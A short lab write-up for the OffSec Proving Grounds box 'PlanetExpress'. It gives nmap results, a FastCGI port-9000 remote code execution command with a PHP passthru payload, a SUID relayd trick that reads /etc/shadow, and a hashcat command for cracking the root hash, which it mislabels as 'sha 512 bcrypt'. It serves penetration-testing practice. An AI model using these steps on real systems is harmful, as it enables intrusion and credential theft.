# PlanetExpress

## Intro

PlanetExpress is a 'warm up' category linux box from offsec proving grounds.  

## Enum

### Nmap

All tcp ports scanned with nmap.

```
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
9000/tcp open  cslistener? syn-ack ttl 61
```

### Directories

The following directory was found.  

`/config/config.yml`


## User

Fast cgi script, see hacktricks pentesting fast-cgi 9000.  

`python fpm.py -c "<?php passthru('id'); ?>" -p 9000 192.168.232.205 /var/www/html/planetexpress/plugins/PicoTest.php | head -n 10`


## Root

relayd binary has suid.  

`/usr/sbin/relayd -C /etc/shadow`

Crack root password (sha 512 bcrypt).  

`hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

